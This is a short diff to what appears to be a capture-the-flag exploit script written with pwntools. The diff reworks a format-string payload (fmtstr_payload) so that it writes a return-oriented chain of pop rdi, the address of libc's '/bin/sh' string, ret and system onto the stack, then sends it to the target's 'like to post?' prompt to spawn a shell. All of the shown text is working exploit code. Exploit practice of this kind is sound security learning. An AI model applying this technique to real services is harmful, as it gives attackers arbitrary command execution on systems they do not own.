@@ -50,12 +50,15 @@ pop_rdi = elf.address + 0x000000000000127b
 
 print(libc.symbols["system"])
 
-write_dict = {rbp_0x200 + 0x200: rbp_0x200 + 224, rbp_0x200 + 0x208: leave_ret}
-payload = fmtstr_payload(6, write_dict, write_size="byte")
-payload += p64(pop_rdi)
-payload += p64(next(libc.search(b"/bin/sh\x00")))
-payload += p64(ret)
-payload += p64(libc.symbols["system"])
+rbp = rbp_0x200 + 0x200
+write_dict = {
+    rbp + 8: p64(pop_rdi),
+    rbp + 16: next(libc.search(b"/bin/sh\x00")),
+    rbp + 24: p64(ret),
+    rbp + 32: p64(libc.symbols["system"])
+}
+
+payload = fmtstr_payload(6, write_dict, write_size="short")
 
 io.sendlineafter("like to post?", payload)
 
